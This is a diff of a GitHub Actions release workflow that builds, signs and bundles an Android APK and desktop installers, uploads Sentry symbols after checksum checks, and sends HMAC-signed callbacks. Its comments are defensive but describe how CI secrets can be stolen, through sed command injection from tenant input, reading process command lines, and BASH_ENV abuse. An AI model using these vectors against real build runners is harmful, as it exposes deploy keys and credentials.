+            # apps/ui/vite.config.ts: hidden maps, debug-id inject, moved out of dist/ to here.
+            echo "QUASAR_UI_SOURCEMAPS_DIR=$dir/ui"
+            echo "QUASAR_DEBUG_FILES_DIR=$dir/debug"
+          } >> "$GITHUB_ENV"
+          echo "enabled=true" >> "$GITHUB_OUTPUT"
+
+      - name: Build UNSIGNED RELEASE universal APK (arm64-v8a + armeabi-v7a)
+        shell: bash
+        env:
+          NDK_HOME: ${{ env.ANDROID_NDK_ROOT }}
+          SENTRY_SYMBOLS: ${{ steps.sentry.outputs.enabled }}
+        # No ANDROID_KEYSTORE in env → build-android-apk.sh leaves it unsigned;
+        # sign.yml signs it in the private repo with the real release key.
+        run: |
+          set -euo pipefail
+          if [ "$SENTRY_SYMBOLS" = "true" ]; then
+            export CARGO_PROFILE_RELEASE_DEBUG=line-tables-only
+            export CARGO_PROFILE_RELEASE_STRIP=none
+            export RUSTFLAGS="${RUSTFLAGS:-} -C link-arg=-Wl,--build-id=sha1"
+          fi
+          bash scripts/build-android-apk.sh
+          if [ "$SENTRY_SYMBOLS" = "true" ]; then
+            apk="$(find crates/tauri-app/gen/android/app/build/outputs/apk/universal/release -name '*.apk' -print -quit)"
+            [ -n "$apk" ] || { echo "::error::no release APK to strip"; exit 1; }
+            bash scripts/split-debug.sh android-apk "$apk"
+          fi
+
+      # Same tamper check + isolated upload as the desktop job (see there).
+      - name: Sentry symbols — verify the pinned tools are untouched (android)
+        if: steps.sentry.outputs.enabled == 'true'
+        shell: bash
+        env:
+          TOOLS: ${{ steps.sentry.outputs.tools }}
+          CLI_SHA256: ${{ steps.sentry.outputs.cli_sha256 }}
+          UPLOAD_SHA256: ${{ steps.sentry.outputs.upload_sha256 }}
+        run: |
+          set -euo pipefail
+          export PATH=/usr/bin:/bin
+          sha() { if [ -x /usr/bin/sha256sum ]; then /usr/bin/sha256sum "$1"; else /usr/bin/shasum -a 256 "$1"; fi | awk '{print $1}'; }
+          cli="$TOOLS/sentry-cli"; [ "$RUNNER_OS" = Windows ] && cli="$cli.exe"
+          [ "$(sha "$cli")" = "$CLI_SHA256" ] || { echo "::error::sentry-cli changed after the gate verified it"; exit 1; }
+          [ "$(sha "$TOOLS/sentry-upload.sh")" = "$UPLOAD_SHA256" ] || { echo "::error::sentry-upload.sh changed after the gate copied it"; exit 1; }
+          echo "✓ sentry-cli + sentry-upload.sh unchanged since the gate"
+
+      - name: Sentry symbols — upload debug files + UI source maps (android)
+        if: steps.sentry.outputs.enabled == 'true'
+        continue-on-error: true
+        shell: bash
+        env:
+          SENTRY_AUTH_TOKEN: ${{ secrets.SENTRY_AUTH_TOKEN }}
+          TOOLS: ${{ steps.sentry.outputs.tools }}
+          CLI_SHA256: ${{ steps.sentry.outputs.cli_sha256 }}
+          UPLOAD_SHA256: ${{ steps.sentry.outputs.upload_sha256 }}
+          DEBUG_DIR: ${{ steps.sentry.outputs.debug_dir }}
+          UI_MAPS_DIR: ${{ steps.sentry.outputs.ui_maps_dir }}
+          # GITHUB_ENV is writable by the build steps: nothing it could set may
+          # run code in this shell.
+          BASH_ENV: ""
+          ENV: ""
+        run: |
+          set -euo pipefail
+          # Only system tools, only the gate's copies — checked again right
+          # before use, from a fresh directory (a GITHUB_PATH entry or a swap
+          # between the verify step and here gets nothing).
+          export PATH=/usr/bin:/bin
+          sha() { if [ -x /usr/bin/sha256sum ]; then /usr/bin/sha256sum "$1"; else /usr/bin/shasum -a 256 "$1"; fi | awk '{print $1}'; }
+          run="$(mktemp -d)"; trap 'rm -rf "$run"' EXIT
+          ext=""; [ "$RUNNER_OS" = Windows ] && ext=".exe"
+          cp "$TOOLS/sentry-cli$ext" "$run/sentry-cli$ext"; cp "$TOOLS/sentry-upload.sh" "$run/sentry-upload.sh"
+          [ "$(sha "$run/sentry-cli$ext")" = "$CLI_SHA256" ] || { echo "::error::sentry-cli changed after the gate verified it"; exit 1; }
+          [ "$(sha "$run/sentry-upload.sh")" = "$UPLOAD_SHA256" ] || { echo "::error::sentry-upload.sh changed after the gate copied it"; exit 1; }
+          export SENTRY_CLI="$run/sentry-cli$ext"
+          export QUASAR_SENTRY_SOURCE_ROOT="$GITHUB_WORKSPACE"
+          up() { bash "$run/sentry-upload.sh" "$@"; }
+          echo "· sentry release: $(up release)"
+          up debug-files \
+            "$GITHUB_WORKSPACE/target/aarch64-linux-android/release/libquasar_app_lib.so" \
+            "$GITHUB_WORKSPACE/target/armv7-linux-androideabi/release/libquasar_app_lib.so"
+          up sourcemaps "$UI_MAPS_DIR"
+
+      - name: Collect the unsigned release APK
+        id: collect
+        shell: bash
+        run: |
+          set -euo pipefail
+          apk="$(find crates/tauri-app/gen/android/app/build/outputs/apk/universal/release -name '*.apk' | head -1 || true)"
+          [ -n "$apk" ] || { echo "no release APK produced"; find crates/tauri-app/gen/android -name '*.apk'; exit 1; }
+          # Rename to the operator's brand name + version (desktop bundles are
+          # already productName-named; keep Android consistent).
+          product="$(python3 -c "import json;print(json.load(open('crates/tauri-app/tauri.conf.json'))['productName'])")"
+          safe="$(printf '%s' "$product" | tr ' /' '__')"
+          newname="${safe}_${VERSION}_universal.apk"
+          mv "$apk" "$(dirname "$apk")/$newname"
+          apk="$(dirname "$apk")/$newname"
+          echo "apk=$apk" >> "$GITHUB_OUTPUT"
+          echo "name=$newname" >> "$GITHUB_OUTPUT"
+          echo "· built $apk"
+          echo "· built android apk" >> "$GITHUB_STEP_SUMMARY"   # summaries are public and unmasked
+
+      - name: Upload UNSIGNED APK to R2 staging (installer/android-universal)
+        shell: bash
+        env:
+          APK:      ${{ steps.collect.outputs.apk }}
+          APK_NAME: ${{ steps.collect.outputs.name }}
+        run: |
+          set -euo pipefail
+          aws s3api put-object --endpoint-url "$R2_ENDPOINT" \
+            --bucket "$STAGING_BUCKET" \
+            --key "$BUILD_ID/installer/android-universal/$APK_NAME" \
+            --body "$APK" >/dev/null
+          echo "· uploaded to s3://$STAGING_BUCKET/$BUILD_ID/installer/android-universal/$APK_NAME"
+
+      # NO run-artifact upload here. This repo is PUBLIC, and run artifacts are
+      # downloadable by any GitHub account for their whole retention window — the
+      # APK embeds the brand's oss_enc_key, invite code, panel endpoints and
+      # identity. The same APK is already staged to R2 (previous step) where
+      # sign.yml picks it up, so nothing is lost; for manual QA, pull it from the
+      # staging bucket instead.
+
+  # ── Fan-in: dispatch sign.yml ONCE after all selected builds succeed ─────────
+  # ── Fan-in: sign the APK, collate, bundle, deliver, tell the console ────────
+  #
+  # Everything used to be dispatched to a SECOND workflow in the private repo,
+  # purely because that's where the signing keys lived. The desktop client no
+  # longer self-updates, so desktop needs no key at all, and the only key left is
+  # the Android release keystore — which lives here as a repo secret, exactly as
+  # this repo already holds PRIVATE_REPO_DEPLOY_KEY (a strictly more valuable
+  # credential). Keeping a whole second pipeline for it bought no real isolation
+  # while adding an R2 round-trip, a repository_dispatch, and a build-state
+  # machine that could lose a callback.
+  publish:
+    needs: [setup, compile, android]
+    # Partial success: publish whatever actually staged, as long as the run wasn't
+    # cancelled and setup produced a plan — even if SOME platforms failed.
+    # (fail-fast:false leaves compile.result == 'failure' while the successful
+    # legs still staged.) The "nothing staged" case is caught below and fails the
+    # job so the console hears 'failed' instead of a false 'published'.
+    if: >-
+      ${{ !cancelled() && needs.setup.result == 'success'
+          && (needs.compile.result != 'skipped' || needs.android.result != 'skipped') }}
+    runs-on: ubuntu-latest          # MUST be Linux (1x multiplier) — never mac/win.
+    env:
+      # Only used to READ the unsigned artifacts back from the staging bucket and
+      # to write the finished bundle there. There is NO release-OSS upload:
+      # quasar-publish runs --local-only and the operator downloads the bundle
+      # through the console to publish on their own OSS.
+      NOTES: ${{ inputs.notes }}
+    steps:
+      # The private source is needed for quasar-publish + brands/<slug>/brand.yaml
+      # + the release-readme template.
+      - name: Load inputs (masked)
+        shell: bash
+        run: |
+          set -euo pipefail
+          inp() { jq -r ".inputs.$1 // \"\"" "$GITHUB_EVENT_PATH"; }
+          slug="$(inp slug)"; bid="$(inp build_id)"
+          [ -n "$slug" ] && echo "::add-mask::$slug"
+          [ -n "$bid" ]  && echo "::add-mask::$bid" && echo "::add-mask::${bid:0:8}"
+          {
+            echo "SLUG=$slug"
+            echo "VERSION=$(inp version)"
+            echo "BUILD_ID=$bid"
+            echo "QUASAR_BUILD_ID=$bid"
+            echo "TARGETS=$(inp targets)"
+            echo "SOURCE_SHA=$(inp source_sha)"
+          } >> "$GITHUB_ENV"
+      - name: Checkout PRIVATE source (read-only deploy key)
+        uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # v4
+        with:
+          repository: codeman9528/QuasarAPP
+          ssh-key: ${{ secrets.PRIVATE_REPO_DEPLOY_KEY }}
+          # Empty → default branch (checkout's own fallback), so a manual
+          # dispatch without source_sha behaves exactly as it used to.
+          ref: ${{ env.SOURCE_SHA }}
+
+      # Rust is needed only to build+run quasar-publish (small, and rust-cache'd).
+      - name: Mask brand identity in logs
+        shell: bash
+        run: |
+          set -euo pipefail
+          f="brands/$SLUG/brand.yaml"
+          [ -f "$f" ] || exit 0
+          # name / identifier / window_title / the brand's own hosts: all of it
+          # identifies the customer, and builder + tauri print them.
+          grep -E '^[[:space:]]*(name|identifier|window_title|panel_base|update_base_url|public_url_base):' "$f" \
+            | sed -E 's/^[^:]*:[[:space:]]*"?([^"]*)"?[[:space:]]*$/\1/' \
+            | while IFS= read -r v; do
+                [ ${#v} -ge 2 ] && echo "::add-mask::$v"
+                host="$(printf '%s' "$v" | sed -nE 's#^https?://([^/:]+).*#\1#p')"
+                [ -n "$host" ] && echo "::add-mask::$host"
+              done || true
+      - uses: dtolnay/rust-toolchain@688313b0823df1393bcebb1b4add0438a6d36884 # 1.88.0
+      - uses: Swatinem/rust-cache@6323deb102c322ba6fcbdcafc7e3dddab59af2b6 # v2
+        with: { prefix-key: "v1-quasar-farm" }   # bump with the other two
+
+      - name: Pull staged artifacts from R2
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p staging
+          aws s3 cp --endpoint-url "$R2_ENDPOINT" --recursive \
+            "s3://$STAGING_BUCKET/$BUILD_ID/" staging/
+
+      - name: Detect staged Android APK
+        id: apk
+        shell: bash
+        run: |
+          apk="$(find staging/installer -name '*.apk' 2>/dev/null | head -1 || true)"
+          echo "path=$apk" >> "$GITHUB_OUTPUT"
+          if [ -n "$apk" ]; then echo "found=true" >> "$GITHUB_OUTPUT"; else echo "found=false" >> "$GITHUB_OUTPUT"; fi
+
+      - name: Set up JDK for apksigner
+        if: steps.apk.outputs.found == 'true'
+        uses: actions/setup-java@cf277c60eb25467037889841efdb72551f06f6c3 # v4
+        with: { distribution: temurin, java-version: "17" }
+      - name: Set up Android build-tools (zipalign + apksigner)
+        if: steps.apk.outputs.found == 'true'
+        uses: android-actions/setup-android@9fc6c4e9069bf8d3d10b2204b1fb8f6ef7065407 # v3
+        # The action's default is "tools platform-tools"; Google removed the
+        # legacy `tools` package from the SDK repository, so sdkmanager exits 1
+        # ("Failed to find package 'tools'") and the job dies here. Nothing in
+        # this build uses `tools` (cmdline-tools ships with the action).
+        with:
+          packages: platform-tools
+      - name: Install build-tools
+        if: steps.apk.outputs.found == 'true'
+        run: sdkmanager "build-tools;34.0.0"
+
+      # The one real key in the whole pipeline. Android refuses to install an
+      # upgrade signed by a different key than the installed app, so this must be
+      # STABLE across releases — a rotated key forces every user to uninstall
+      # (losing their data) before they can update.
+      - name: Sign the Android APK with the release keystore
+        if: steps.apk.outputs.found == 'true'
+        shell: bash
+        env:
+          ANDROID_KEYSTORE_BASE64:   ${{ secrets.ANDROID_KEYSTORE_BASE64 }}
+          ANDROID_KEY_ALIAS:         ${{ secrets.ANDROID_KEY_ALIAS }}
+          ANDROID_KEYSTORE_PASSWORD: ${{ secrets.ANDROID_KEYSTORE_PASSWORD }}
+          ANDROID_KEY_PASSWORD:      ${{ secrets.ANDROID_KEY_PASSWORD }}
+          APK_PATH:                  ${{ steps.apk.outputs.path }}
+        run: |
+          set -euo pipefail
+          apk="$APK_PATH"
+          if [ -z "${ANDROID_KEYSTORE_BASE64:-}" ]; then
+            echo "::error::APK staged but ANDROID_KEYSTORE_BASE64 secret is unset — cannot ship an unsigned APK"
+            exit 1
+          fi
+          signed="${apk%-unsigned.apk}"; [ "$signed" = "$apk" ] && signed="${apk%.apk}-signed"; signed="${signed}.apk"
+          scripts/android-sign-apk.sh "$apk" "$signed"
+          # Drop the unsigned APK so the installers step publishes only the signed one.
+          [ "$signed" != "$apk" ] && rm -f "$apk" || true
+
+      - name: Collate installers → installers.json (local, no upload)
+        shell: bash
+        run: |
+          set -euo pipefail
+          args=()
+          if [ -d staging/installer ]; then
+            for dir in staging/installer/*/; do
+              arch="$(basename "$dir")"
+              f="$(ls "$dir"* 2>/dev/null | head -1 || true)"
+              [ -n "$f" ] && args+=( --platform "$arch=$f" )
+            done
+          fi
+          if [ ${#args[@]} -gt 0 ]; then
+            cargo run -p quasar-publish -- installers \
+              --brand "brands/$SLUG/brand.yaml" \
+              --version "$VERSION" \
+              --notes "$NOTES" \
+              --local-only \
+              "${args[@]}"
+          else
+            echo "no installers staged; skipping installers.json"
+          fi
+
+      # If EVERY platform failed, nothing staged → no index was collated. Fail here
+      # so the failure callback fires (build → failed) instead of publishing an
+      # empty release and reporting a false "published".
+      - name: Fail if nothing was built (all platforms failed)
+        run: |
+          if [ ! -f dist/publish/installers.json ]; then
+            echo "::error::no platform produced an installer — nothing to publish"
+            exit 1
+          fi
+
+      - name: Bundle release for operator download
+        if: success()
+        shell: bash
+        run: |
+          set -euo pipefail
+          mkdir -p release-bundle
+          # dist/publish is NOT copied in. In --local-only mode it holds exactly one
+          # file, installers.json, which nothing reads any more: the client never
+          # did, and the console's per-platform artifact list that did has been
+          # removed. It stays on disk only as the "did any platform build"
+          # sentinel checked in the step above. Shipping it just made operators
+          # upload a file with no effect.
+          # Installer packages, flattened.
+          find staging -type f \
+            \( -name '*.AppImage' -o -name '*.deb' -o -name '*.rpm' \
+               -o -name '*.exe' -o -name '*.msi' \
+               -o -name '*.pkg' -o -name '*.dmg' -o -name '*.apk' \) \
+            -exec cp -f {} release-bundle/ \; 2>/dev/null || true
+          # Operator-facing guide (what each artifact is + how to publish). Kept as
+          # a tracked template so it's not an unwieldy YAML heredoc. Substitute the
+          # brand slug + version AND the operator's OWN configured directories
+          # (read from brands/<slug>/brand.yaml) so it names the exact URLs they
+          # upload to, not a placeholder.
+          BRAND="brands/${SLUG}/brand.yaml"
+          UPDATE_BASE=$(grep -m1 -E '^[[:space:]]*update_base_url:' "$BRAND" 2>/dev/null \
+            | sed -E 's/^[^:]*:[[:space:]]*"?([^"]*)"?[[:space:]]*$/\1/')
+          # config.bin lives at the first fetch_mirrors entry, else update_base_url.
+          CONFIG_BASE=$(awk '/^[[:space:]]*fetch_mirrors:/{f=1;next} f&&/^[[:space:]]*-/{gsub(/^[[:space:]]*-[[:space:]]*"?|"?[[:space:]]*$/,"");print;exit} f&&/^[[:space:]]*[a-z_]+:/{exit}' "$BRAND" 2>/dev/null)
+          [ -n "$UPDATE_BASE" ] || UPDATE_BASE="（见 console 品牌里填的「软件更新源」）"
+          [ -n "$CONFIG_BASE" ] || CONFIG_BASE="$UPDATE_BASE"
+          # Literal substitution, NOT sed: these values come from a tenant's brand
+          # form, and inside `s#…#<value>#` a `#` ends the expression — after
+          # which GNU sed will happily run `w <file>` / `r <file>` on this runner
+          # (which holds the deploy key and the R2 credentials).
+          SLUG="$SLUG" VERSION="$VERSION" UPDATE_BASE="$UPDATE_BASE" CONFIG_BASE="$CONFIG_BASE" \
+          python3 - docs/build-farm/release-readme.txt "release-bundle/发布说明.txt" <<'PYEOF' || true
+          import os, sys
+          t = open(sys.argv[1], encoding="utf-8").read()
+          for k in ("SLUG", "VERSION", "UPDATE_BASE", "CONFIG_BASE"):
+              t = t.replace(f"__{k}__", os.environ.get(k, ""))
+          open(sys.argv[2], "w", encoding="utf-8").write(t)
+          PYEOF
+          # GPLv3 §6 expects the notices to travel WITH the binaries, and the
+          # operator — not us — is the one distributing them, so the file has to
+          # be in the zip they receive. The client also carries an offline copy
+          # (设置 → 关于 → 开源许可) for the end user.
+          cp THIRD-PARTY-NOTICES.md "release-bundle/THIRD-PARTY-NOTICES.md"
+          # Build provenance — appended to the BOTTOM of 发布说明.txt. build_id is
+          # unique per console build and is ALSO baked into the binary (设置→关于
+          # shows the same #id + time), so a stale same-version zip is caught by
+          # cross-checking these two. Directly answers "这个包到底新不新".
+          {
+            echo ""
+            echo "======================================================================"
+            echo "构建信息 —— 用于核对这个包是不是最新的"
+            echo "──────────────────────────────────────────────"
+            echo "品牌:      ${SLUG}"
+            echo "版本:      ${VERSION}"
+            echo "构建ID:    #${BUILD_ID:0:8}    (完整 ${BUILD_ID})"
+            echo "构建时间:  ${{ needs.setup.outputs.build_time }}"
+            echo "构建运行:  ${{ github.run_id }}"
+            echo ""
+            echo "核对方法:装好后打开 App → 设置 → 关于,版本号后面的「#xxxxxxxx」和时间应与上面一致。"
+            echo "不一致 = 你装的不是这个包(拿到旧包/装错了)。"
+          } >> "release-bundle/发布说明.txt"
+          # End-user-facing macOS install guide (brand-agnostic → plain copy).
+          # Operator forwards it to Mac users so the un-notarized pkg's Gatekeeper
+          # prompt doesn't read as "broken".
+          cp -f docs/build-farm/macos-install.txt "release-bundle/macOS安装说明.txt" 2>/dev/null || true
+          ls -la release-bundle
+
+      # Deliver via R2, NOT a GitHub artifact: each bundle is ~350MB, a free
+      # account has only 500MB of shared Actions storage, and artifacts in a PUBLIC
+      # repo are downloadable by anyone. The console pulls this object and proxies
+      # it to the operator; the staging bucket's 1-day lifecycle cleans up.
+      - name: Upload bundle to R2 (console downloads from here)
+        if: success()
+        shell: bash
+        run: |
+          set -euo pipefail
+          ( cd release-bundle && zip -r -q ../release.zip . )
+          aws s3 cp --endpoint-url "$R2_ENDPOINT" release.zip \
+            "s3://$STAGING_BUCKET/$BUILD_ID/signed/release.zip"
+          echo "→ s3://$STAGING_BUCKET/$BUILD_ID/signed/release.zip ($(du -h release.zip | cut -f1))"
+
+      # Secrets reach these two steps through `env:` and are read as "$VAR".
+      #
+      # They used to be interpolated into the `run:` text. GitHub renders that
+      # text BEFORE bash parses it, so the HMAC key was written into the script
+      # AND handed to `openssl dgst -hmac <key>` as an argument — and a command
+      # line is readable by EVERY process on the runner (`ps -ef`,
+      # /proc/<pid>/cmdline), including anything a dependency's build script
+      # spawns, no matter which user it runs as. An environment variable is
+      # readable only by the same user's processes, which is the whole difference.
+      # `openssl dgst -hmac` has no way to take the key off the command line, so
+      # the HMAC is computed by python3 (preinstalled on ubuntu runners) reading
+      # the key from its own environment instead.
+      - name: Callback orchestrator — success (HMAC-signed)
+        if: success()
+        shell: bash
+        env:
+          CALLBACK_HMAC_SECRET: ${{ secrets.CALLBACK_HMAC_SECRET }}
+          CALLBACK_URL:         ${{ secrets.ORCHESTRATOR_CALLBACK_URL }}
+          RUN_ID:               ${{ github.run_id }}
+        run: |
+          built="$(ls -1 staging/installer 2>/dev/null | paste -sd, - || true)"
+          body="{\"build_id\":\"$BUILD_ID\",\"slug\":\"$SLUG\",\"version\":\"$VERSION\",\"status\":\"published\",\"run_id\":$RUN_ID,\"built\":\"$built\"}"
+          sig=$(printf '%s' "$body" | python3 -c 'import hashlib,hmac,os,sys; print(hmac.new(os.environb[b"CALLBACK_HMAC_SECRET"], sys.stdin.buffer.read(), hashlib.sha256).hexdigest())')
+          # Strip any stray whitespace/newline from the secret — a trailing \n in
+          # ORCHESTRATOR_CALLBACK_URL makes curl reject it ("Malformed input to a
+          # URL function") and, being -fsS on the success path, fails the whole
+          # (already-succeeded) job.
+          url=$(printf '%s' "$CALLBACK_URL" | tr -d '[:space:]')
+          curl -fsS --retry 5 --retry-delay 5 --retry-all-errors -X POST "$url" \
+            -H "content-type: application/json" -H "x-signature: sha256=$sig" --data "$body"
+
+      - name: Callback orchestrator — failure
+        if: failure()
+        shell: bash
+        env:
+          CALLBACK_HMAC_SECRET: ${{ secrets.CALLBACK_HMAC_SECRET }}
+          CALLBACK_URL:         ${{ secrets.ORCHESTRATOR_CALLBACK_URL }}
+          RUN_URL:              ${{ github.server_url }}/${{ github.repository }}/actions/runs/${{ github.run_id }}
+        run: |
+          body="{\"build_id\":\"$BUILD_ID\",\"slug\":\"$SLUG\",\"version\":\"$VERSION\",\"status\":\"failed\",\"run_url\":\"$RUN_URL\"}"
+          sig=$(printf '%s' "$body" | python3 -c 'import hashlib,hmac,os,sys; print(hmac.new(os.environb[b"CALLBACK_HMAC_SECRET"], sys.stdin.buffer.read(), hashlib.sha256).hexdigest())')
+          url=$(printf '%s' "$CALLBACK_URL" | tr -d '[:space:]')
+          curl -fsS --retry 5 --retry-delay 5 --retry-all-errors -X POST "$url" \
+            -H "content-type: application/json" -H "x-signature: sha256=$sig" --data "$body" || true
